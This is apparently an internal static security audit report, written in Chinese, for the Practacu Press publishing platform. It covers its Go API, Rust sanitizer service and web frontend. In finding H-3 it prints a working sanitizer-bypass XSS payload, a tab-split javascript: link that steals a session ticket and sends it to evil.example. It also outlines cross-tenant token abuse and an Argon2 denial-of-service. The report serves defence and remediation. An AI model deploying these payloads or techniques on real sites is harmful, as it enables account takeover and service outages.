# Practacu Press 缺陷与漏洞审计报告（汇总）

**日期：** 2026-10-31
**范围：** Go 后端（`apps/api`）、Rust 安全服务（`services/security`）、Web 前端（`apps/web`）、数据库 schema（`apps/api/ent/schema`、`migrations`）
**方法：** 纯静态源码审查。每位审计员独立阅读源码，逐条定位到 `文件:行` 并引用原文片段。
**致命前提：** 本机 `pwsh` 启动即退出码 `0xC0000142`（DLL 初始化失败），PTY 亦无法启动。
因此**本轮没有执行任何 `go build` / `go test` / `go vet` / `cargo test` / `npm test` / `vitest` / 构建或运行**。所有结论都是读代码得出的，凡需要实测才能定论的内容一律列在第 6 节「待运行时确认」，不作为结论使用。

> ## ⚠️ 后续状态（2026-11-01 补记，阅读本文前请先看这一行）
>
> 1. **上述「无法执行」已解除**：`0xC0000142` 的根因是 DSH 的 Windows 沙箱（`workspace-write`）下 `powershell.exe` 在 DLL 初始化阶段失败，与 PowerShell 安装无关，也与本仓库无关。放行后已实跑：`go build/vet/test` 全绿（30 包）、`vitest` 301 项通过、`cargo test` 41 项通过。
> 2. **5 条 High 已全部修复并验证**，其中两条的定性在本轮被修正：
>    - **H-1 不是缺陷**，而是 `docs/superpowers/specs/2026-10-24-page-builder-redesign-design.md:178` 明确写下的「本轮不做」；经确认后已改为服务端持久化（架构改动）。
>    - **H-2 / AUTH-1 的范围过宽**：`analytics`/`community`/`content`/`notifications`/`messaging`/`taxonomy`/`site` 七个 handler 本来就有 `cross_site` 判断，真正的洞只有 `PublicUser` 一处。
> 3. 修复内容、文件清单与验证证据见 **[`2026-11-01-high-fixes.md`](2026-11-01-high-fixes.md)**；仍打开的 Medium/Low 清单在该文件 §8。
> 4. **第二批（L-1、L-2、DATA-3、DATA-4）也已修复**，见 **[`2026-11-01-hardening-fixes.md`](2026-11-01-hardening-fixes.md)**：请求级 deadline、SQLite 真实启动路径的 WAL/busy_timeout、请求体上限、匿名媒体下载。

---

## 1. 一句话结论

**没有发现可直接远程利用的 Critical 漏洞**：JWT 校验（EdDSA-only、`kid` 绑定、`iss` 校验）、refresh 轮换（CAS + 族撤销）、CSRF 双提交（定长比较）、媒体存储路径穿越防护、Rust 侧 HTML 清洗（ammonia 4.2.4 白名单）都经得起对抗性复核。**但存在 5 个 High**，集中在三处：**多租户令牌不与 Host 绑定**、**客户端清洗器可绕过（经主题/页面包导入投递）**、**安全服务的 Argon2 可被一个登录风暴打死**；另有 1 个架构级缺陷（站点设计只存在浏览器本地）会让「页面编排 + 主题」对访客完全不生效。

| 严重度 | 数量 | 分布 |
|---|---|---|
| Critical | 0 | — |
| High | 5 | auth 1 · web 2 · rust 1 · Lead 1 |
| Medium | 24 | auth 5 · data 7 · web 5 · rust 5 · Lead 2 |
| Low | 23 | auth 5 · data 5 · web 5 · rust 6 · Lead 2 |
| **合计** | **52** | 另有 1 项「阻塞项」：本机 shell 全坏，任何验证都无法进行 |

---

## 2. 优先修复的 5 条（High）

### H-1 [Lead 复核] 站点设计（页面 / 区块 / 主题 / 自定义 CSS / 置顶 / 封面）只保存在浏览器 `localStorage`，服务端完全没有存储

**证据**

```ts
// apps/web/src/lib/backend.tsx:178-192
export function loadConfig(): WebConfig | null {
  const raw = localStorage.getItem(CONFIG_KEY);   // 'pp.web.config.v1'
  ...
export function saveConfig(config: WebConfig) { localStorage.setItem(CONFIG_KEY, JSON.stringify(config)); }
```

```ts
// apps/web/src/lib/customize.ts:766-771  所有后台页（Pages / Appearance / ThemeBuilder）都走这里
const { config, updateConfig } = useAuth();
const customization = useMemo(() => readCustomization(config), [config]);
const update = useCallback((patch) => { updateConfig({ customization: { ...readCustomization(config), ...patch } }); });
```

服务端侧没有任何对应：`apps/api/ent/schema/site.go:29-47` 的 Site 字段只有 slug / name / domain / visibility / publish_mode / description / disabled，**没有 customization 列**；`apps/web/src/lib/api.ts` 的站点端点只有 `GET /sites/{id}`、`PATCH settings`、`PUT domain`、成员、analytics、taxonomy，**没有主题/页面端点**。

**影响（用户可见）**

1. 站长在安装引导里精心配好主题、首页区块、自定义页面后，**任何其他浏览器/设备/访客打开站点看到的都是代码内置默认外观**；`CustomPage.tsx:16-18` 用 `customization.pages.find(...)` 查页面，别人浏览器里没有这份 JSON，自定义页面直接 404。
2. 反过来说，这恰好让 WEB-1/WEB-2 的 XSS 无法成为「存储型」——攻击面被这个缺陷限制在导入路径上（见 H-3）。
3. 换端口/换域名（`scripts/serve.mjs:165-171` 专门为此写了迁移通道）就丢站点设计。

**判断**：如果这不是「单人单机自用」的有意取舍，那它是本项目影响面最大的缺陷——它让「页面编排器」这一整块功能在真实站点上不生效。请在修 XSS 之前先确认这是否是产品意图。

**最小修复**：给 `site` 加一列 `customization json`（或独立表 `site_customization`），暴露 `GET/PUT /sites/{id}/customization`（写权限 = `ActionManageSite`），前端 `readCustomization/update` 改为「优先远端、离线回退本地」。**注意**：一旦这么做，H-3 立刻从 High 升级为 Critical，必须先修清洗器。

---

### H-2 [auth-audit，Lead 已复核] 站点绑定的 access token 从不与 Host 解析出的站点比对；`RequireSiteMatch` 是死代码

**证据**

```go
// apps/api/internal/transport/http/gin/router.go:78-81   —— 全站只挂了这一个守卫
guard = middleware.RequireAuth(deps.AccessTokens)
optionalAuth = middleware.OptionalAuth(deps.AccessTokens)
```

```go
// apps/api/internal/transport/http/gin/middleware/auth.go:64-91 —— 跨站守卫写好了，但全仓库只被测试引用
// RequireSiteMatch rejects a principal whose token was issued for another site.
// This is the check that stops a token minted on site A from acting on site B when the
// site is selected by hostname.
func RequireSiteMatch() gin.HandlerFunc { ... if principal.SiteID != resolved.ID { ... } }
```

**可复现的攻击链**（多租户部署，站点 B 为 `members_only`）：

```go
// apps/api/internal/site/handler.go:195-200
if _, _, authenticated := h.principal(c); !authenticated && resolved.IsMembersOnly() {
    _ = c.Error(apperr.Unauthenticated().WithDetail("reason", "members_only_site")); return
}
member, err := h.service.PublicMember(c.Request.Context(), resolved.ID, c.Param("userID"))
```

1. 攻击者在任意公开站点 A 自助注册，拿到 `sid = A` 的 access token；
2. 用该 token 请求 `GET https://<B 的域名>/api/v1/users/<userID>`；
3. `OptionalAuth` 把 A 的身份挂上 → 「members_only」判断被当成「已登录」放行 → 读 `resolved.ID`（= B）；
4. 返回 B 站成员的 `user_id / display_name / role / created_at`，**可以据此挑出 B 站的 site_admin / platform_admin 下手**，同时构成「某 id 是否为 B 站成员」的探测口。

不对称性说明这是缺陷而非设计：`taxonomy/handler.go:102-109` 与 `analytics/service.go:79-82` 各自手写了站点比对，说明「令牌站点 == 解析站点」是既定不变量，只有 `PublicUser` 漏了。

**最小修复**：`router.go` 里 `guard = chain(RequireAuth, RequireSiteMatch)`（`RequireRole` 同理），并把 `PublicUser` 的判定从「有会话」改成「是**本解析站点**的活跃成员」。

**前提说明**：目前没有 HTTP 路由能创建第二个站点（只有 `cmd/seed` 与桌面 bootstrap），所以单站点部署下影响为零。这点在分报告里被如实列为「需运行时确认」。

---

### H-3 [web-audit] 客户端 HTML 清洗器的 `javascript:` 过滤可用制表符绕过

**证据**

```ts
// apps/web/src/lib/markdown.ts:319-323
const value = attr.value.trim();
if (name.startsWith('on') || name === 'srcdoc') el.removeAttribute(attr.name);
if ((name === 'href' || name === 'src' || name === 'xlink:href') && /^javascript:/i.test(value)) {
  el.removeAttribute(attr.name);
}
```

`DOMParser` 已把 `&#9;` 解码成真正的 TAB，`trim()` 只剪两端，`/^javascript:/` 锚定首字符 → 不匹配 → 属性保留；序列化时 TAB 原样写回；浏览器解析 URL 时**会先删除所有 ASCII tab/newline** → 最终变成 `javascript:`。载荷：

```html
<!-- 放进 text 区块正文，或放进被导入的页面/主题包 -->
<a href="java&#9;script:fetch('/api/v1/auth/ws-ticket',{method:'POST'}).then(r=>r.json()).then(d=>fetch('https://evil.example/?t='+d.ticket))">点这里继续</a>
```

渲染点：`components/blocks/MediaBlocks.tsx:57`（唯一闸门 `sanitizeHtml(renderMarkdown(body))`）→ `Home.tsx` / `CustomPage.tsx` / `ContentDetail.tsx:198` 的排版区。同源 JS 还能读 `pp_csrf` cookie 并打 `/auth/token/refresh` 换新 token → **点一下就账号接管**。

**可达性（如实说明）**：直接写区块是管理员操作，单人安装属自伤。真实投递路径是产品自己宣传的迁移/分享方式——`lib/customize.ts:950-972` 的 `parseCustomizationFile` 接受任意 JSON 且原样保留页面 `layout`，所以「导入这套新首页布局」就是投递载体。**有 H-1 存在时它不可能是存储型**；H-1 修好之后它会变成全站存储型 XSS。

**最小修复**：换成 DOMPurify（其 `ALLOWED_URI_REGEXP` 正确处理该问题），或把「黑名单 `javascript:`」改成「白名单 scheme」（先 `value.replace(/[\u0000-\u0020\u00a0]+/g,'').toLowerCase()`，再允许 `http:`/`https:`/`mailto:`/`/`/`#`）。

---

### H-4 [web-audit] 主题 token 只做前缀匹配，导入的主题可注入任意全局 CSS

```ts
// apps/web/src/lib/theme.ts:348-355  —— 只判断开头
/^color-mix\(/ /^var\(/ ...
// :441-448 themeCss() 拼进 `:root{...}` → components/CustomizationLayer.tsx:19 写入 <style>
```

`;` / `}` 可闭合声明并跳出 `:root`，从而注入任意全局 CSS（覆盖后台 UI、钓鱼遮罩、`url()` 外链追踪）。同样只经「导入主题」投递，单独严重度 Medium，与 H-3 同源，建议一起修（改为严格解析 + 值白名单，不接受拼接）。

---

### H-5 [rust-audit] Argon2 在 async 运行时里做阻塞 CPU 计算且完全无并发/长度/超时上限

**证据**

```rust
// services/security/src/transport/grpc.rs:46  +  src/password.rs:51  —— async fn 内直接跑 Argon2（64 MiB/次）
```

登录/注册是**未认证可达**路径，Go 侧只有 240 次/分/IP 的固定窗口 → 单 IP 即可拉起约 240 个并发 Argon2，每个 64 MiB（瞬时约 15 GiB）+ 占满 tokio worker，导致 `SanitizeContent` 排队 → **整个安全服务不可用 → 全站发布与上传按 fail-closed 全部拒绝**。这不需要任何凭据。

**最小修复**：`tokio::task::spawn_blocking` + 信号量（例如并发 ≤ CPU 核数）+ 入参长度上限 + 每请求 deadline；Go 侧对 `/auth/login`、`/auth/register` 增加独立的、按账号 + IP 双键的更严额度。

---

## 3. 其余发现一览

括号内为分报告编号。**证据等级**：✅ = Lead 亲自复核过源码；📋 = 分队报告（有 `文件:行` 与引用，未二次复核）。

### 3.1 认证 / 授权（`docs/audit/auth-findings.md`）

| # | 严重度 | 问题 | 证据 |
|---|---|---|---|
| A-1 | Medium ✅ | refresh 族没有绝对寿命：每次轮换都 `ExpiresAt = now + 30d`，`tokens.go:28` 注释却写「absolute lifetime of one refresh lineage」；被窃 token 可无限续命 | `auth/service.go:449-459` |
| A-2 | Medium ✅ | 登录无按账号节流/锁定，只有每进程每 IP 固定窗口；IPv6 轮换或分布式即可爆破 | `rate_limit.go:107`、`router.go:46-51` |
| A-3 | Medium 📋 | 登录枚举：未知邮箱在哈希前提前返回，禁用账号返回不同的 `account_disabled` 码，与「统一响应」的设计说明相矛盾 | `auth/service.go:270-303` |
| A-4 | Medium ✅ | 限流内存表宣称的 50k 上限**没有被强制执行**：满了只尝试清理过期项然后照样插入；清理是全局锁下的 O(n) 全表扫描 | `rate_limit.go:68-91` |
| A-5 | Medium ✅ | 任何 site_admin 都能把**任意未占用的域名**声明成自己的，且 `domain_verified_at` 直接写 `now`，无需任何所有权证明；`domain_verification_token` 字段存在于 schema 但从不写入 | `site/service.go:537-538`、`ent/schema/site.go:35` |
| A-6 | Low | `POST /auth/logout` 无 CSRF（跨站强制登出） | `auth/handler.go:357-368` |
| A-7 | Low | 注册返回 `identity_exists`，可枚举账号 | `auth/handler.go:456-459` |
| A-8 | Low | 管理员改邮箱不清 `verified_at` | `sitestore/store.go:287-292` |
| A-9 | Low | `PATCH /sites/{id}/settings` 不做重复域名检查 → 约束冲突表现为 500 而非 409 | `site/service.go:474-487` |
| A-10 | Low | 密码重置链接的 origin 取自 `Host` 头（仅在无域名单站点回退下可被利用） | `auth/handler.go:278-287` |

### 3.2 领域 / 数据层（`docs/audit/data-findings.md`）

| # | 严重度 | 问题 | 证据 |
|---|---|---|---|
| D-1 | Medium ✅ | 匿名可读 `members_only` 站点的分类/标签/描述——全链路没有任何层检查 `visibility_mode`（与 `content/handler.go:60-63` 的做法不一致） | `taxonomy/handler.go:94-111` |
| D-2 | Medium 📋 | 分析埋点允许**未认证写入**；报表把整个时间窗所有行读进内存再聚合 | `analytics/handler.go:54,110-136` |
| D-3 | Medium 📋 | 无请求体大小上限：multipart 上传先整个落盘/进内存，之后才校验声明大小 | `media/handler.go:139-146` |
| D-4 | Medium ✅ | `GET /media/{assetID}` 用 `optionalAuth` 但处理函数要求身份 → 匿名 401，**已发布文章里的图片对未登录读者全部裂图**，与契约声明 `security: []` 矛盾 | `media/handler.go:38,110-114` |
| D-5 | 功能缺口 | 通知从不产生：`Notify` 无生产调用方，收件箱永远空 | `notifications/service.go:51-66` |
| D-6 | 功能缺口 | 审核模块没有 handler、没有接线：无法举报/处理举报 | `moderation/`（无 handler.go） |
| D-7 | Medium 📋 | 消息列表按 ASC + LIMIT 返回**最旧** N 条，没有游标 → 活跃会话永远看不到最新消息 | `messagingstore/store.go:202-207` |
| D-8 | Low | `SaveDraft` 不做状态条件更新：一个过期编辑可以把已发布文章打回草稿、取消待审 | `contentstore/store.go:92-107` |
| D-9 | Low | 草稿的分类**永远清不掉**，更新时静默保留旧值 | `contentstore/store.go:104-106` |
| D-10 | Low | 会话已读游标不校验是否属于该会话、也不强制前进；防倒退的辅助函数是死代码 | `messagingstore/store.go:226-241` |
| D-11 | Low | 内容列表逐行查一次 `publishMode`（用 `context.Background()`），排序走无索引的 `(site_id, created_at)` | `content/handler.go:303-309` |
| D-12 | Low | `CompleteUpload` 插 asset 与关闭会话是两次非同步写 → 重复 complete 报 500 | `media/service.go:235-247` |

**正面结果（已核对，无问题）**：9 个 store 中每一处供请求链路使用的读取都带租户谓词；草稿读取/更新的鉴权与已发布不可变；发布状态机 + 清洗闸门（未经清洗的 HTML 永不进入 `dangerouslySetInnerHTML`）；`LocalStorage.resolve` 与 `S3Storage.objectKey` 的穿越防护（我另复核过 `storage.go:169-190`：拒绝 `\`、前导 `/`、盘符、`..`，且在 clean 后的绝对路径上做包含校验）；上传归属与扫描 fail-closed；通知/会话/事件补偿的受众隔离；**全部查询走 Ent 构造器，无一处字符串拼 SQL**。

### 3.3 Web 前端（`docs/audit/web-findings.md`）

| # | 严重度 | 问题 | 证据 |
|---|---|---|---|
| W-1 | Medium | 登出接口失败被吞掉，UI 显示已登出但 HttpOnly refresh cookie 仍活着 | `lib/api.ts:326-334` |
| W-2 | Medium | 全站无 `frame-ancestors`/`X-Frame-Options`，且「我在 iframe 里」被当成「我是可信预览框」 | `lib/access.ts:386-392` |
| W-3 | Medium | 「个人站点」形态下**任何已登录账号**在客户端都被算成 `owner`；能力矩阵完全是前端本地的 | `lib/permissions.ts:174-178` |
| W-4 | Medium | 页面编排器向下拖动区块会落到差一格的位置 | `lib/blockTree.ts:132-144` |
| W-5 | Medium | 站内跳转会丢失未保存的文章内容 | `lib/hooks.ts:91-101` |
| W-6…W-10 | Low | 区块 HTML 构造器未转义 + `execCommand('insertHTML')`；`PreviewBridge` 选择器未 `CSS.escape`；`?mode=live` 会把管理员密码发给任意 API base；明暗逻辑链可死循环；`useAsync` 切换 id 时先画出上一篇 | 见分报告 |

**正面结果**：`rendered_html` 这条「信任服务端」的通道确实有服务端 ammonia 清洗兜底；评论/私信正文走 React 文本节点；写操作无 CSRF 面（Bearer-only）；CORS 回显精确 origin 且拒绝 `*` + credentials；`next=` 跳转有校验；**token 不放 localStorage、不进日志**。

### 3.4 Rust 安全服务（`docs/audit/security-service-findings.md`）

| # | 严重度 | 问题 | 证据 |
|---|---|---|---|
| S-1 | Medium | `violations` 是对原始源码的 7 个子串扫描，不是「实际删掉了什么」的记录：漏 `onfocus=`/`srcdoc=`/`<style`/实体编码的 `javascript:`，误报正文里提到 `javascript:`，而 Go 侧**把这个字段直接丢弃**（不审计、不落库） | `content.rs:112-128`、`content/service.go:470-471` |
| S-2 | Medium | `policy_version` 只记录不校验：`IsSanitized()` 仅判非空，启动 Ping 丢掉 `ValidateSecurityPolicy` 的版本与限制 → 旧策略清洗过的 HTML 永远可发布 | `content/service.go:490-493`、`main.go:501-506` |
| S-3 | Medium | `mapError` 只映射 3 个 gRPC code；崩溃的 peer 返回 `Unknown`/`Internal` 会穿透成普通错误，而没有调用方检查 `ErrUnavailable` → 文档承诺的 fail-closed 实际未被强制 | `securityclient/grpc.go:188-201` |
| S-4 | Medium | 服务是明文 h2c、无认证、无拦截器；`SECURITY_GRPC_BIND` 可把它挪出 loopback → 能连上的人就拿到密码哈希 oracle + CPU/内存垃圾桶 | `services/security/src/main.rs:9-17` |
| S-5 | Medium（潜在） | `format:"markdown"` 被当作 HTML 原样处理（不转 markdown）。今天安全**仅因为** Go 先用 goldmark 渲染再清洗；任何直接调用方 + markdown 渲染器 = 完全绕过（`[x](javascript:alert(1))` 原样存活） | `content.rs:71-75` |
| S-6…S-11 | Low | 上传「检测」实际只比对 64 字节样本的前 4 字节就报 Clean；argon2 verify 忽略策略参数；argon2 未启用 `zeroize` feature；verify 路径明文不擦除；`class` 在所有标签上任意放行；`text/plain` 64 字节切在多字节字符中间会被误判 `magic_mismatch`（中文场景会踩到） | 见分报告 |

**最重要的负面结果**：**没能构造出清洗器绕过**。审计员逐条把 svg / math / foreignObject / template / noscript / style / iframe / `javascript:` 各种混淆 / xlink / srcset / formaction / meta / base 走了一遍 ammonia 4.2.4 的 `clean_child`/`attr_filter`/`is_url_attr`/`check_expected_namespace`/`clean_node_content` 与 html5ever 序列化器，全部被拦；并且**主动推翻了自己**「深嵌套标记导致栈溢出」的假设（ammonia 清洗与序列化都是 `VecDeque` 迭代实现）。这份「无洞」的论证过程本身是可复核的资产。

### 3.5 Lead 亲自审出的其余项

| # | 严重度 | 问题 | 证据 |
|---|---|---|---|
| L-1 | Medium ✅ | **没有任何请求写超时，也没有每请求 deadline**。`main.go:51-53` 注释声称「Per request deadlines are applied by middleware instead」，但全仓库 `grep WriteTimeout/SetWriteDeadline` 只命中 WS 一处——注释是假的。慢读客户端可无限占用 goroutine + 数据库连接；SQLite 池上限=1，等于全站串行化 | `cmd/server/main.go:326-332`、`db/client.go:23` |
| L-2 | Medium ✅ | 真实服务端启动路径**只补 `foreign_keys`，不补 WAL 和 `busy_timeout`**（带 WAL/busy_timeout 的 `SQLiteDSN()` 只在测试里用）。交付报告 2.1 说的「pragma 自动补全（外键、WAL、busy_timeout）」与实际不符 → 并发写直接 `SQLITE_BUSY`、读写互斥 | `db/client.go:53-55,115-124` |
| L-3 | Low ✅ | WS 升级在 `CORS_ALLOWED_ORIGINS` 为空时 `InsecureSkipVerify: true`（任意 Origin 可连）；有配置时把完整 URL 当 OriginPattern 传，而该库按 Origin 的 **host** 匹配 → 跨源部署下 WS 可能连不上（**需握手实测**） | `ws/handler.go:83-86`、`main.go:226` |
| L-4 | Low ✅ | 桌面 bootstrap「自愈」：启动时若站点没有任何 admin，就把**最早注册的成员**提升为 `platform_admin`。与 `PP_ALLOW_REMOTE_API=1` 同时打开时是首注册者竞态（已由 `APP_ENV=production` 禁止组合，故仅 dev/desktop） | `cmd/server/bootstrap.go:76-109` |
| L-5 | Low ✅ | 桌面 bootstrap 的 `BootstrapFirstAdmin: cfg.DesktopMode`：首个注册者即站长，同一前提 | `cmd/server/main.go:378` |
| L-6 | Low ✅ | `reaction` 的读/删不带 `site_id` 谓词（目前靠 ULID 全局唯一兜底；一旦 id 方案变化即成跨租户缺陷） | `communitystore/store.go:262-283` |

---

## 4. 架构级观察（不是单条 bug，但决定了修复顺序）

1. **`RequireSiteMatch` / `RequireRole` 是死代码**（`middleware/auth.go:64-111`，仅测试引用）。设计文档 `docs/superpowers/plans/2026-10-18-practacu-press-progress.md:59` 声称「跨站令牌拒绝」已实现——这是对设计的回归，不是新需求。
2. **「已实现」与「已接线」之间有系统性缝隙**：审核模块（D-6）、通知生产（D-5）、媒体下载对匿名关闭（D-4）、契约里的 `security: []` 与实际不符。建议加一个「路由 ↔ 契约 ↔ 依赖注入」的一致性测试（仓库里已有 `openapi_contract_test.go`，但显然没覆盖这些点）。
3. **前端把「站点」当成浏览器本地的一个 JSON**（H-1）。这一条同时解释了为什么这么多 XSS 只能自伤，也意味着前端权限（W-3）天然不可信、必须以服务端为准——目前服务端确实是对的，但这是「巧合地正确」。
4. **fail-closed 是三处独立实现**（Go 的 `Unavailable`、扫描状态归一、`IsSanitized`），没有任何一处强制检查（S-3/S-2）。安全性质靠约定而非断言维系。

---

## 5. 建议的修复顺序

**第 0 批：先恢复可验证性（阻塞项）**
`pwsh` 在本机 100% 启动失败（`0xC0000142`）。这意味着 `scripts/test.ps1`、`go test ./...`、`cargo test`、`npm run test` 目前**一个都跑不起来**，本报告的 52 条结论全部只能靠读代码。请先修这个（通常是 AppLocker/WDAC、杀软或 DLL 劫持导致的 `powershell.exe` 初始化失败；`cmd.exe` + `> %TEMP%\t.txt 2>&1` 可对照确认），否则任何修复都无法回归验证。

**第 1 批：High（1–2 天）**
`H-5`（spawn_blocking + 信号量 + 限流，改动最小、收益最大）→ `H-2`（router 挂 `RequireSiteMatch` + `PublicUser` 改判成员身份）→ `H-3`（换 DOMPurify 或改白名单 scheme）→ `H-4`（主题值严格解析）→ **最后**再决定 `H-1`（先确认产品意图；若改为服务端持久化，H-3 必须先修完）。

**第 2 批：Medium 里能立刻收口的一批**
`L-1`（加写超时 / 每请求 deadline，注释同步改）· `L-2`（启动即补 WAL + busy_timeout）· `A-4`（限流表硬上限）· `A-2`（登录按账号 + IP 双键节流）· `D-3`（`http.MaxBytesReader`）· `D-4`（匿名可读 clean 资源）· `D-1`（taxonomy 校验 visibility）· `S-3`（`mapError` 覆盖 `Unknown/Internal` 且调用方检查）· `A-1`（refresh 族加 `family_expires_at`）。

**第 3 批：功能缺口与一致性**
`D-5`/`D-6` 接线或从「已实现」清单里移除 · `D-7`（消息倒序 + 游标）· `W-3`（前端权限只能作 UI 提示，注释写死）· `A-5`（域名所有权验证，`domain_verification_token` 已就位）· `S-2`（`policy_version` 真正参与判定）· `S-1`（violations 落审计）。

---

## 6. 待运行时确认（静态无法定论，未计入上面的结论）

1. **多租户**：没有 HTTP 路由能创建第二个站点（只有 seed 与桌面 bootstrap），H-2 / A-5 / A-7 的实际影响取决于是否真的存在多站点部署。
2. WS 的 OriginPattern 语义（L-3 后半）：需要一次真实握手确认跨源是否被拒。
3. Argon2 并发下的峰值 RSS 与 tokio 饥饿时间（H-5）——审计员给出的是量级推算。
4. 清洗器幂等性与解析层超线性退化（`sanitize(sanitize(x)) == sanitize(x)`）。
5. 限流表在真实攻击流量下的增长率（A-4 的代码缺陷已确认，触发阈值未量化）。

---

## 7. 已验证安全（正面结果，避免重复排查）

JWT：EdDSA-only + `kid` 绑定 + `iss` 校验 + 拒 `alg:none`；refresh：CAS 轮换 + 重放即撤销整族 + 会话绑站点；cookie：HttpOnly/Secure/SameSite 齐备；CSRF：双提交 + **定长比较**；密码重置：高熵、只存哈希、一次性、重置后撤销会话；CORS：精确 origin 比对，`*` + credentials 启动期拒绝；可信代理：默认不信任任何转发头；WS 票据：32 字节随机、只存哈希、60 秒、单次消费、失败即删；媒体：路径穿越双向防护（我另复核）、超声明大小用 `CopyN` 硬截断、非 clean 一律 404；SQL：全 Ent 构造器，无字符串拼接；Rust 清洗：白名单紧凑，mXSS/命名空间混淆类被 ammonia 4.2.4 关闭；前端：token 不入 localStorage、不入日志，`rendered_html` 有服务端清洗兜底。

---

## 8. 分报告索引

| 文件 | 内容 | 条数 |
|---|---|---|
| [`docs/audit/auth-findings.md`](auth-findings.md) | 认证、会话、CSRF、限流、RBAC、站点权限 | 11 |
| [`docs/audit/data-findings.md`](data-findings.md) | 领域逻辑、9 个 store、schema、媒体存储 | 12 |
| [`docs/audit/web-findings.md`](web-findings.md) | XSS sink、token 处理、postMessage、前端权限、功能 bug | 12 |
| [`docs/audit/security-service-findings.md`](security-service-findings.md) | 清洗器对抗性复核、Argon2、gRPC 边界 | 12 |

每份分报告都包含：完整证据（`文件:行` + 引用原文）、利用/失败场景、最小修复、`Verified safe` 清单，以及 `Needs runtime confirmation` 清单。
